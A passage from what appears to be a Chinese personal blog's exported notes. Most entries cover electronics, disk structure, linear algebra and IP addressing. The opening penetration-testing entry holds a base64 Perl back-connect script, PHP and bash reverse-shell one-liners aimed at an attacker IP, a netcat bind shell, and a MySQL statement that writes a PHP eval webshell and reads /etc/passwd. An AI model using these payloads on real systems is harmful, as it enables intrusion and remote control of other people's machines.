class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br></pre></td></tr></table></figure> 终端执行反弹
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听端口号&quot;)&#x27;</span></span><br><span class="line">$ php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听端口号);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h4 id="正向连接">正向连接</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">被攻击机:</span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">$ <span class="built_in">rm</span> -f /tmp/f; <span class="built_in">mkfifo</span> /tmp/f</span><br><span class="line">$ <span class="built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">$ nc -lvvp 被攻击机监听端口 -e /bin/bash</span><br><span class="line"></span><br><span class="line">攻击机:</span><br><span class="line"></span><br><span class="line">$ nc 被攻击机ip 被攻击机监听端口</span><br></pre></td></tr></table></figure>
<h3 id="mysql">Mysql</h3>
<h4 id="写出文件">写出文件</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">&#x27;&lt;? php eval($_POST[密码]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;d:/wwwroot/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="读取文件">读取文件</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux渗透</category>
      </categories>
  </entry>
  <entry>
    <title>电力计算公式</title>
    <url>/%E7%94%B5%E5%8A%9B%E8%AE%A1%E7%AE%97%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="电阻">电阻</h3>
<p><span class="math display">\[
R=\frac{U}{I}=I^{-1}U=(\frac{P}{U}^{-1})U=\frac{U}{P}U=\frac{U^2}{P}
\]</span></p>
<h3 id="电流i">电流<span class="math inline">\(I\)</span></h3>
<p><span class="math display">\[
I=\frac{U}{R} \\
I=\frac{Q}{t}
\]</span></p>
<h3 id="电压u">电压<span class="math inline">\(U\)</span></h3>
<p><span class="math display">\[
U=IR
\]</span></p>
<h3 id="电池容量-q">电池容量 <span class="math inline">\(Q\)</span></h3>
<p><span class="math display">\[
Q=It \\
t=\frac{Q}{I}
\]</span></p>
<h3 id="功率p">功率<span class="math inline">\(P\)</span></h3>
<p><span class="math display">\[
P=UI \\
I=\frac{P}{U} \\
U=\frac{p}{I}
\]</span></p>
]]></content>
      <categories>
        <category>整活</category>
      </categories>
  </entry>
  <entry>
    <title>电子电路符号</title>
    <url>/%E7%94%B5%E5%AD%90%E7%94%B5%E8%B7%AF%E7%AC%A6%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="重要结论">重要结论:</h2>
<h4
id="零值电阻从电气特性上来说是等效于零值电压源的.">零值电阻从电气特性上来说,是等效于零值电压源的.</h4>
<h4
id="独立电压源的电流是由外电路决定的.">独立电压源的电流是由外电路决定的.</h4>
<h4
id="开路或无穷值电阻从电气特性上等效为零值电流源.">开路或无穷值电阻从电气特性上等效为零值电流源.</h4>
<p>2b法是指根据两个b(branch支路)求解出b个电流和b个电压</p>
<p><span class="math inline">\(P_a\)</span>是吸收功率 <span
class="math inline">\(P_d\)</span>是发出功率 <span
class="math inline">\(U_S\)</span>是电压源,Voltage Source <span
class="math inline">\(I_S\)</span>是电流源,current Intensity Source
<span class="math inline">\(R_{EQ}\)</span>是等效电阻</p>
]]></content>
      <categories>
        <category>电子电路</category>
      </categories>
  </entry>
  <entry>
    <title>电子电路基础</title>
    <url>/%E7%94%B5%E5%AD%90%E7%94%B5%E8%B7%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h4 id="电功率">电功率</h4>
<p>定义:单位时间内所转换的电能 符号:<span
class="math inline">\(P\)</span>(直流电路) 单位:<span
class="math inline">\(W\)</span></p>
<p><span class="math display">\[
\begin{aligned}
    电源产生功率: P_U=EI \\
    电源输出功率: {P_U}_S=U_SI \\
    负载采用功率: P_L=U_LI
\end{aligned}
\]</span></p>
<hr />
<h4 id="电能">电能</h4>
<p>定义:在时间<span
class="math inline">\(t\)</span>内转换的电功率称为电能 <span
class="math display">\[
\begin{aligned}
    W=Pt
\end{aligned}
\]</span> 符号:<span class="math inline">\(W\)</span> 单位:<span
class="math inline">\(J\)</span> 单位转换:千瓦时(<span
class="math inline">\(kW\cdot h\)</span>) * 一千瓦时等于一度电 :<span
class="math inline">\(1kW\cdot h=3.6 \times 10^6J\)</span></p>
]]></content>
      <categories>
        <category>电子电路</category>
      </categories>
  </entry>
  <entry>
    <title>硬盘相关知识</title>
    <url>/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h3 id="硬盘">硬盘</h3>
<h4 id="机械式硬盘">机械式硬盘</h4>
<p>由磁片,磁头构成,磁盘按扇区划分 机械式磁盘可以由多个磁盘片构成
每个磁盘片相同位置的扇区,每个大小512Byte构成的一个空心圆柱叫做柱面
为了实现快速数据读写,硬盘往往会多个磁头向多个磁盘片同时写入数据
同一个文件,会被写到多个磁盘片内</p>
<h4 id="低级格式化">低级格式化</h4>
<p>划分磁道,扇区</p>
<h4 id="磁道">磁道</h4>
<p>磁头在磁盘掠过的每个圆环叫一个磁道,每个磁道可以分成若干个扇区.</p>
<h4 id="扇区">扇区</h4>
<p>扇区,每个大小为512Byte,历史中的每个扇区的大小为512Byte,但是随着技术发展,大家约定俗成的扇区大小变成了4096Byte,但是为了兼容以前的操作系统,磁盘允许每个4096Byte扇区虚拟为八个512Byte,如果所有数据都是从4096Byte扇区的头512Byte开始写入,而不是从后3584Byte中开始写入,这叫做4K对齐
如果从后7个虚拟扇区开始写入,就叫做4K不对齐
4K对齐的好处很多,比如数据写入速度变快,因为扇区的大小越大,所形成的扇区数就明显变少,超过扇区大小的数据存储在多个块中时,所需要操作系统寻找的扇区变少,数据能更快的存储
如果仍然使用512为一块/簇,会造成写入速度极慢</p>
<h4 id="柱面">柱面</h4>
<p>每个硬盘都会有许多块磁片,可以同时写入,加快写入效率,缺点就是,一但有一片瓷片损坏,整个硬盘数据都会发生损坏,整个柱面都是不可用的</p>
<h4 id="块block">块/block</h4>
<p>windows中,存储数据以簇为单位,linux中,以块为单位(只是叫法不同,但是实际含义都是一个意思),系统中常常规定多少个扇区为一个簇(块),因为一个扇区的大小为512b,所以簇(块)必须为扇区的整数倍,常见的簇(块)大小为1024b,2048b,4096b(4k最常用)
每个块/簇由2^n倍的扇区构成</p>
<h4 id="主引导记录mbr">主引导记录mbr</h4>
<p>零磁道,零扇区 512Byte,叫做主引导记录 这个存储空间被划分为三个片段
446Byte:bootloader 启动器,一段代码程序,用于从分区中加载内核(kernel)
64Byte: 16Byte: 用于标识一个分区 最高四个分区,16Byte*4 2Byte: 魔数
标记mbr是否有效</p>
<h4 id="电脑的启动过程">电脑的启动过程</h4>
<p>主板加电,bios程序读入内存,cpu执行bios程序,bios自检程序完成后,加载用户定义的启动顺序
开始寻找磁盘上的mbr,当找到有效的mbr后,bios把mbr存储的bootloader加载入内存,bios程序退出,bootloader开始执行
找到预定的特定分区,寻找操作系统的内核,加载入内存,完成内核的解压缩,运行在内存上,bootloader退出,内核开始工作
内核被加载入特权级0的区域</p>
<p><a
href="http://huaqianlee.github.io/2015/08/21/Linux/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/">深入理解Linux启动过程</a>
<a href="http://c.biancheng.net/view/1016.html">Linux内核的加载过程</a>
<a href="https://blog.51cto.com/linuxzj/1409882">initrd 和
initramfs</a></p>
<h4 id="扩展分区">扩展分区</h4>
<p>存储于硬盘mbr,存储一个指针指向另一个地址,用于绑定扩展分区</p>
<h4 id="分区">分区</h4>
<p>一个硬盘被分成若干个逻辑块,用标号进行标识分区,例如sdX</p>
<h4 id="高级格式化">高级格式化</h4>
<p>用于创建文件系统,mk2fs</p>
<h4 id="文件系统">文件系统</h4>
<p>也是程序的一种,他负责文件的增删改查
文件系统分为几个部分,磁盘引导,超级块,inode池,数据存储区</p>
<h4 id="inode">inode</h4>
<p>inode用于记录文件的一些属性,包括修改时间,创建时间,文件数据块的位置,硬链接数,权限,UID,GID等,但不记录文件名,文件名由文件夹记录
详细请下载linuxkernel 在include/linux struct inode结构体中有详细声明</p>
<h4 id="inode-table">inode table</h4>
<p>文件系统中专门分出用于存储inode文件的地方,inode文件每个大小一般为128Byte或256Byte,inode数量在创建文件系统时给出,按照一定比例生成inode,比如两个块一个inode</p>
<h4 id="位图bitmap">位图/Bitmap</h4>
<p>使用1/0来记录块是否被使用,使用inode的原因是,便于操作系统识别未使用过的系统资源,方便检索
block bitmap:记录块的使用情况 inode bitmap:记录inode的使用情况</p>
<h4 id="超级块super-block">超级块/Super Block</h4>
<p>开头的第一个byte是byte 0，从 byte
1024开始往后的一部分数据。超级块中的数据其实就是文件卷的控制信息部分，也可以说它是卷资源表，有关文件卷的大部分信息都保存在这里。例如：硬盘分区中每个block的大小、硬盘分区上一共有多少个block
group、以及每个block
group中有多少个inode.超级块存在备份,创建文件系统的时候被随机备份于若干块中,若分区superblock被破坏,可以使用备份块恢复</p>
<h4 id="vfs">vfs</h4>
<p>不同文件系统的协调器,给出了一个统一接口</p>
<h4 id="分区命令">分区命令</h4>
<p>fdisk 指定硬盘 m为操作方法</p>
<h4 id="安全卸载硬盘">安全卸载硬盘</h4>
<p>要先杀死所有在分区上运行着的程序 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fuser -mk 挂载点</span><br></pre></td></tr></table></figure></p>
<h4 id="重新分区">重新分区</h4>
<p>需要先把硬盘第一个分区(MBR)的所有信息清除 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> -<span class="keyword">if</span> /dev/zero -of 硬盘设备文件 bs=512 count=1</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>站内下载</title>
    <url>/%E7%AB%99%E5%86%85%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="脚本下载">脚本下载</h3>
<p><a href="https://divint3.cn/scripts/zsh_install.sh">Oh_my_zsh</a></p>
<p><a
href="https://divint3.cn/scripts/ssr_server.sh">ShadowSocksR_server</a></p>
<p><a
href="https://divint3.cn/scripts/ssr_client.sh">ShadowSocksR_client</a></p>
<p><a href="https://divint3.cn/scripts/tcp.sh">TCP加速</a></p>
<p><a
href="https://divint3.cn/scripts/v2ray_caddy.sh">V2ray_caddy版</a></p>
<p><a
href="https://divint3.cn/scripts/v2ray_nginx.sh">V2ray_nginx版</a></p>
<hr />
<h3 id="软件下载">软件下载</h3>
<p><a href="https://divint3.cn/tools/Cencrack.exe">Cencrack
Windows工具下载工具</a></p>
<p><a href="https://divint3.cn/tools/listary.exe">Listary
Windows文件查找工具</a></p>
<p><a href="https://divint3.cn/tools/Cencrack.exe">CodeInject
代码注入工具</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>线性代数的本质</title>
    <url>/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%9A%84%E6%9C%AC%E8%B4%A8/</url>
    <content><![CDATA[<h2
id="所有能用数字表示的向量都依赖于其基basic">所有能用数字表示的向量都依赖于其基(basic)</h2>
<h3 id="向量的表示">向量的表示</h3>
<ol type="1">
<li>一个向量最好使用箭头表示法</li>
<li>多个向量使用点表示,因为向量的起点永远都是原点,这样更方便观察</li>
</ol>
<h3 id="线性相关">线性相关</h3>
<ol type="1">
<li>有多个向量,且移除一个不影响张成空间,就称被移除的向量与原向量线性相关</li>
<li>一个向量,可以被其他向量的线性组合表示,则说明他们线性相关</li>
</ol>
<h3 id="线性无关">线性无关</h3>
<ol type="1">
<li>不能被其他向量,或其他向量的线性组合表示,说明他们线性无关</li>
<li>如果所有向量都给张成空间增加了新的维度,他们被称为线性无关</li>
</ol>
<h3 id="向量的基本运算">向量的基本运算</h3>
<p>向量加法: <span class="math display">\[
\left[
  \begin{matrix}
    a \\
    b
  \end{matrix}
\right]+
\left[
  \begin{matrix}
    c \\
    d
  \end{matrix}
\right]=
\left[
  \begin{matrix}
    a+c \\
    b+d
  \end{matrix}
\right]
\]</span></p>
<p>向量乘法: <span class="math display">\[
x\left[
  \begin{matrix}
    a \\
    b
  \end{matrix}
\right]=
\left[
  \begin{matrix}
    ax \\
    bx
  \end{matrix}
\right]
\]</span></p>
<h3 id="线性组合">线性组合</h3>
<ol type="1">
<li>两个数乘'向量的和,被称为两个向量的</li>
<li><span
class="math inline">\(\overrightarrow{aw}+\overrightarrow{bv}\)</span>
被称作w与v的线性组合,它们构成了一个新向量 <span class="math display">\[
a\hat{w}+b\hat{v}=一个新向量
\]</span></li>
<li>向量的缩放再相加</li>
<li>一组基的线性组合可以在他们的张成空间构成任意向量,张成空间为线或点除外</li>
</ol>
<h3 id="矩阵">矩阵</h3>
<ol type="1">
<li>矩阵就是空间的变换</li>
<li>两个矩阵相乘代表依次进行变换</li>
<li>变换顺序,从右到左</li>
</ol>
<h3 id="张成空间">张成空间</h3>
<ol type="1">
<li>向量任意组合所构成的空间:所有终点落在这个平面上向量的集合,是这两个向量张成的空间</li>
</ol>
<h3 id="向量的变换">向量的变换</h3>
<ol type="1">
<li>用原坐标乘变换后<span
class="math inline">\(\hat{i}\hat{j}\)</span>的坐标,原向量与矩阵相乘再相加,<span
class="math inline">\(a\hat{i}+b\hat{j}\)</span>,就是把矩阵代表的线性变换作用于向量</li>
</ol>
<p>计算方法: <span class="math inline">\(\left[\begin{matrix}a &amp; b
\\c &amp; d\end{matrix}\right]\)</span>是变换后<span
class="math inline">\(\hat{i}\hat{j}\)</span>的坐标 <span
class="math display">\[
\left[
\begin{matrix}
  a &amp; b \\
  c &amp; d
\end{matrix}
\right]
\left[
  \begin{matrix}
    x \\
    y
  \end{matrix}
  \right]=x
  \left[
  \begin{matrix}
    a \\
    c
  \end{matrix}
\right]+y
\left[
  \begin{matrix}
    b \\
    d    
  \end{matrix}
\right]=
\left[
  \begin{matrix}
    ax+by \\
    cx+dy
  \end{matrix}
\right]
\]</span></p>
<h3 id="行列式">行列式</h3>
<ol type="1">
<li>代表面积/体积大小的改变倍数,相比于原基</li>
<li>用于计算面积变化的比例</li>
<li>行列式用于描述变换</li>
<li>行列式为零,代表压缩到一条线/一个点上/更小维度</li>
<li>行列式为负,称作改变了空间的定向/感觉空间翻转了</li>
<li>如果i帽在j帽左面或者说j帽在i帽右边,说明空间定向被改变</li>
<li>二阶行列式的计算: <span class="math display">\[
det(\left[
  \begin{matrix}
a &amp; b \\
c &amp; d
  \end{matrix}
\right])=ad-bc
\]</span></li>
<li>计算
如果bc不为零,那么bc代表的是在对角线方向上拉抻或者压缩了多少</li>
<li>右手定则,中指j帽,食指i帽,如果立起拇指正好指向k帽,说明行列式为正如果不能能,行列式结果为负</li>
<li>三阶行列式的计算</li>
</ol>
<p><span class="math display">\[
det(\left[
\begin{matrix}
   a &amp; b &amp; c \\
   d &amp; e &amp; f \\
   g &amp; h &amp; i
  \end{matrix}
\right])=det(\left[
  \begin{matrix}
    e &amp; f \\
    h &amp; i
  \end{matrix}
\right])a-det(\left[
  \begin{matrix}
    d &amp; f \\
    g &amp; i
  \end{matrix}
\right])b+det(\left[
  \begin{matrix}
    d &amp; e \\
    g &amp; h
  \end{matrix}
\right])c=a(ie-hf)-b(di-fg)+c(dh-eg)
\]</span></p>
<h4 id="特殊性质">特殊性质</h4>
<p><span class="math display">\[
det(M1M2)=det(M1)det(M2)
\]</span></p>
<p>用一句话解释就是变化的最终结果与顺序无关</p>
<h3 id="线性方程组">线性方程组</h3>
<p>未知量与系数都在左面,常量都在右边 <span class="math display">\[
\begin{cases}
  2x+5y+3z=-3 \\
  4x+0y+8z=0 \\
  1x+3y+0z=2
\end{cases} \rightarrow
\overbrace{
  \left[
  \begin{matrix}
    2 &amp; 5 &amp; 3 \\
    4 &amp; 0 &amp; 8 \\
    1 &amp; 3 &amp; 0
  \end{matrix}
  \right]
}^{\text{A}}
\overbrace{
  \left[
  \begin{matrix}
    x \\
    y \\
    z \\
  \end{matrix}
  \right]
}^{\overrightarrow{x}}
=\overbrace{
  \left[
  \begin{matrix}
    -3 \\
    0 \\
    2
  \end{matrix}
  \right]
}^{\overrightarrow{v}}
A\overrightarrow{x}=\overrightarrow{v}
\]</span></p>
<h3 id="秩代表变换后的空间的维度">秩代表变换后的空间的维度</h3>
<ul>
<li>满秩 说明空间在变换后没有被压缩到更低的维度</li>
</ul>
<h3 id="列空间">列空间</h3>
<ul>
<li>列空间就是矩阵的列所张成的空间</li>
</ul>
<h3 id="点积">点积</h3>
<ul>
<li>一个向量的投影与另一个向量的乘积</li>
<li>为什么是投影呢,因为一个向量可以转化为变换矩阵,再用变换乘法即可得到点积结果
#### 点积的对偶性</li>
<li>点积与顺序无关.</li>
<li>两个相同长度的向量,相互做点乘,他们相互的投影长度总是相等的,其中一个长度发生缩放,缩影也随之缩放相同比率,点乘结果一致.</li>
<li>2D到数轴的线性变化</li>
<li><span class="math inline">\(\hat{u}\)</span>的横纵坐标是<span
class="math inline">\(\hat{u}\)</span>在<span
class="math inline">\(\hat{i}\hat{j}\)</span>上的正交投影,也就是说,<span
class="math inline">\(\hat{u}\)</span>记录的是<span
class="math inline">\(\hat{i}\hat{j}\)</span>线性变换后的位置,所以,它是一个矩阵<span
class="math inline">\(\left[\begin{matrix}u_x\ u_y\end{matrix}
\right]\)</span>.</li>
<li>在原坐标系上建立一个向量,求他在<span
class="math inline">\(\hat{u}\)</span>变换的位置,等同于新向量与<span
class="math inline">\(\hat{u}\)</span>做点乘.</li>
<li>单位向量的点乘可以理解为将向量投影到单位向量<span
class="math inline">\(\hat{u}\)</span>所在的直线上所得到的投影长度.</li>
</ul>
<p><span class="math inline">\(u_x\)</span>代表u在x上的投影,<span
class="math inline">\(u_y\)</span>代表u在y上的投影</p>
<p><span class="math display">\[
\left[
  \begin{matrix}
    u_x\ u_y
  \end{matrix}
\right]
\left[
  \begin{matrix}
    x \\
    y
  \end{matrix}
\right]=u_x\cdot x+u_y\cdot y
\]</span></p>
<p><span class="math display">\[
\left[
  \begin{matrix}
    u_x \\
    u_y
  \end{matrix}
\right]
\left[
  \begin{matrix}
    x \\
    y
  \end{matrix}
\right]=u_x\cdot x+u_y\cdot y
\]</span></p>
<ul>
<li>非单位向量的情况就是,非单位单位向量扩大的倍数乘以投影长度.</li>
</ul>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
  </entry>
  <entry>
    <title>网络通信</title>
    <url>/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<h3 id="交换机就是多路网桥">交换机就是多路网桥</h3>
<h3 id="mac表">MAC表</h3>
<p>由交换机维护,记录了自己子网中的所有主机MAC地址</p>
<h3 id="arp表">ARP表</h3>
<p>由计算机维护,记录了MAC与IP地址的对应关系</p>
<h3 id="路由表">路由表</h3>
<p>由路由器维护,记录了不同网段网段的信息</p>
<h4 id="直连路由">直连路由</h4>
<p>是直接连接在路由器接口的网段，由路由器自动生成.</p>
<h4 id="非直连路由">非直连路由</h4>
<p>就是不是直接连接在路由器接口上的网段，此记录需要手动添加或者是使用动态路由.</p>
<h4 id="主机路由网络路由">主机路由/网络路由</h4>
<p>最佳匹配作为选择标准</p>
<h4 id="默认路由">默认路由</h4>
<p>路由表中无法匹配</p>
<h5 id="路由汇聚">路由汇聚</h5>
<h4 id="网络地址主机地址">网络地址/主机地址</h4>
<h5 id="子网划分">子网划分</h5>
<p>子网掩码借用位/右移位 剩下的地址 全0为网络地址,全一为广播地址
其余为主机地址</p>
<h4 id="合并网络">合并网络</h4>
<p>子网掩码左移 子网个数为(2^位移数)个
由于子网掩码左移,原来子网中的部分广播地址变为可用地址由于多了一位,是原来受限制的位不再受限制,拓展了一位,使原来子网中的广播地址不再是全1,所以可以作为主机地址使用
使用连续子网可以合并为超网</p>
<h3 id="广播">广播</h3>
<h4 id="受限广播">受限广播</h4>
<p>在子网内传播,不被路由转发,地址为255.255.255.255 0xFFFFFFFF ####
直接广播 发送到广播地址,会发送到该子网内的所有主机</p>
<h3 id="网关">网关</h3>
<p>网关就是子网中路由器的地址</p>
<h3 id="ip地址与类别">IP地址与类别</h3>
<h4 id="不进行子网划分">不进行子网划分</h4>
<h4 id="a类">A类:</h4>
<p>地址范围:1.0.0.1-126.255.255.254 (0000
0001.00000000.00000000.00000000~01111110.111111111.11111111.11111110）
地址范围:1.0.0.0-126.255.255.255
（这种写法是把全0全1都算进去了，其它几类类似） 网络号范围:
1~126                        （0000 0001 ~ 0111 1110）
默认子网掩码:255.0.0.0 或  0xFF000000（十六进制）
私有号段:10.0.0.0-10.255.255.255
前1个字节(8位)为网络号，后3个字节(24位)为主机号. A类第1位必须是0.
最大网络数:2^7-2 最大主机数:2^24-2 全0全1的地址不可分配，作为保留地址.
上面减2也是这个原因. 一般用于大型网络.</p>
<h4 id="b类">B类:</h4>
<p>地址范围:128.1.0.1-191.255.255.254  网络号范围:128.1 ~ 191.255
默认子网掩码:255.255.0.0 或 0xFFFF0000(十六进制)
私有号段:172.16.0.0-172.31.255.255
前2个字节(16位)为网络号，后2个字节(16位)为主机号. 前两位固定为10.
最大网络数:2^14-1 最大主机数:2^16-2 一般用于中等规模网络.</p>
<h4 id="c类">C类:</h4>
<p>地址范围:192.0.1.1-223.255.255.254 网络号段范围:192.0.1 ~ 223.255.255
子网掩码:255.255.255.0 或  0xFFFFFF00 (十六进制)
私有号段:192.168.0.0-192.168.255.255
前3个字节(24位)为网络号，后1个字节(8位)为主机号. 前3位固定为110.
最大网络数:2^21-1 最大主机数:2^8-2 一般用于小型网络. #### D类:
地址范围:224.0.0.1-239.255.255.254
是多播地址.该类IP地址的最前面为“1110”，所以地址的网络号取值于224~239之间.
一般用于多路广播用户 . #### E类:
是保留地址.该类IP地址的最前面为“1111”，所以地址的网络号取值于240~255之间.</p>
<h5 id="回送地址">回送地址:</h5>
<p>127.x.x.x        有的资料说，它属于A类. 如127.0.0.1 
等效于localhost或本机IP.  一般用于测试使用. 例如:ping
127.0.0.1来测试本机TCP/IP是否正常.http://127.0.0.1:8080 等效
http://localhost:8080</p>
<h5 id="特殊说明">特殊说明</h5>
<p>每一个字节都为0的地址（0.0.0.0）对应当前主机.
IP地址中的每一个字节都为1的IP地址（255.255.255.255）是当前子网的广播地址.
IP地址中凡是以11110开头的E类IP的地址，都保留用于将来和实验使用.
网络号的第一个8位不能全为0.
IP地址不能以127为开头，该类地址中数字127.0.0.1~127.255.255.254用于回路测试.</p>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>蓝桥杯单片机学习传送门</title>
    <url>/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E4%BC%A0%E9%80%81%E9%97%A8/</url>
    <content><![CDATA[<h2 id="基础学习">基础学习</h2>
<p><a href="http://c.biancheng.net/cpp/danpianji/">C语言中文网</a>
<span id="more"></span></p>
<h3 id="延时函数计算">延时函数计算:</h3>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">周期名称</th>
<th style="text-align: left;">描述</th>
<th style="text-align: center;">时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">振荡(时钟)</td>
<td style="text-align: left;">单片机提供时钟脉冲信号的振荡源的周期</td>
<td style="text-align: center;">T=1/f</td>
</tr>
<tr class="even">
<td style="text-align: center;">状态</td>
<td style="text-align: left;"><span
class="math inline">\(振荡周期经二分频后得到的\)</span></td>
<td style="text-align: center;">2T</td>
</tr>
<tr class="odd">
<td style="text-align: center;">机器</td>
<td
style="text-align: left;">在一个机器周期内，CPU可以完成一个独立的操作</td>
<td style="text-align: center;">12T</td>
</tr>
<tr class="even">
<td style="text-align: center;">指令</td>
<td style="text-align: left;">指CPU完成一条操作所需的全部时间</td>
<td style="text-align: center;">12-12nT</td>
</tr>
</tbody>
</table>
<h4 id="指令">指令：</h4>
<ol type="1">
<li>MUL DIV：仅有的4周期指令</li>
<li>包含DPTR和PC的指令均为2周期指令</li>
<li>所有的绝对跳转和条件转移指令，均为2周期指令</li>
<li>所有包括A寄存器的指令，均为单周期指令</li>
<li>位操作指令中，ANL和ORL是2周期指令</li>
<li>所有包含立即地址的指令，除INC direct及DEC
direct外，均为2周期指令</li>
<li>剩下的均为单周期指令。</li>
</ol>
<h4 id="延时函数">延时函数:</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delay(uint z)&#123;</span><br><span class="line">    uint i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=z;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">921</span>;j++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="i2c总线学习">I2C总线学习</h3>
<p><a
href="https://www.cnblogs.com/whik/p/6650092.html">I2C总线协议学习</a></p>
<h4 id="分析">分析：</h4>
<ol type="1">
<li>先计算你单片机的振荡（时钟）周期 T= 1/晶振（11.0592MHZ）</li>
<li>一次i--操作为12T</li>
<li>忽略变量定义，上述延时函数共需时间：921*z*12T</li>
<li>带入T：921*12*T*z 约为 z ms</li>
</ol>
<h3 id="元器件说明书英文">元器件说明书(英文)</h3>
<p><a href="https://www.alldatasheet.com/">说明书大全-英文</a></p>
<h3 id="传送门">传送门:</h3>
<p><a
href="http://bbs.21ic.com/icview-2408628-1-1.html">【蓝桥杯单片机01】从历年决赛真题中寻找单片机常见的考点</a></p>
<p><a
href="http://bbs.21ic.com/icview-2409172-1-1.html">【蓝桥杯单片机02】LED的基本控制</a></p>
<p><a
href="http://bbs.21ic.com/icview-2409312-1-1.html">【蓝桥杯单片机03】数码管的静态显示</a></p>
<p><a
href="http://bbs.21ic.com/icview-2409380-1-1.html">【蓝桥杯单片机04】数码管的动态显示</a></p>
<p><a
href="http://bbs.21ic.com/icview-2409568-1-1.html">【蓝桥杯单片机05】独立按键的基本操作</a></p>
<p><a
href="http://bbs.21ic.com/icview-2422974-1-1.html">【蓝桥杯单片机06】矩阵键盘的基本控制</a></p>
<p><a
href="http://bbs.21ic.com/icview-2477100-1-1.html">【蓝桥杯单片机07】彻底理解51单片机的中断系统</a></p>
<p><a
href="http://bbs.21ic.com/icview-2477676-1-1.html">【蓝桥杯单片机08】定时器的基本原理与应用</a></p>
<p><a
href="http://bbs.21ic.com/icview-2478488-1-1.html">【蓝桥杯单片机09】串行接口的基本原理与应用</a></p>
<p><a
href="http://bbs.21ic.com/icview-2478572-1-1.html">【蓝桥杯单片机10】串行接口的进阶与实战应用</a></p>
<p><a
href="http://bbs.21ic.com/icview-2478740-1-1.html">【蓝桥杯单片机11】单总线温度传感器DS18B20的基本操作</a></p>
<p><a
href="http://bbs.21ic.com/icview-2479052-1-1.html">【蓝桥杯单片机12】实时时钟DS1302的基本操作</a></p>
<p><a
href="http://bbs.21ic.com/icview-2479198-1-1.html">【蓝桥杯单片机13】基于单片机的电子钟程序设计与调试</a></p>
]]></content>
      <categories>
        <category>单片机</category>
      </categories>
  </entry>
  <entry>
    <title>解决cencrack在线工具包的Direct错误</title>
